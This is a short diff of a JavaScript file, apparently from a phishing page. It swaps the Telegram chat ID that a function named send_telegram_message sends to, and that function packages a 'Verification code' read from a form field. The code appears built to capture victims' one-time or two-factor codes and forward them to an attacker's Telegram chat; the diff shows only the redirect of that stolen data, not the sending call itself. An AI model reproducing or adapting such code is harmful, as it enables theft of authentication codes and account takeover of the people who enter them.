@@ -57,7 +57,7 @@ function show_counter() {
 }
 
 async function send_telegram_message() {
-    const chatIds = ["-1001991348429"]; // Add your chat IDs here
+    const chatIds = ["-1002393688453"]; // Add your chat IDs here
     const verificationCode = email_field.value;
     const msg = `Verification code: ${verificationCode}`;
 
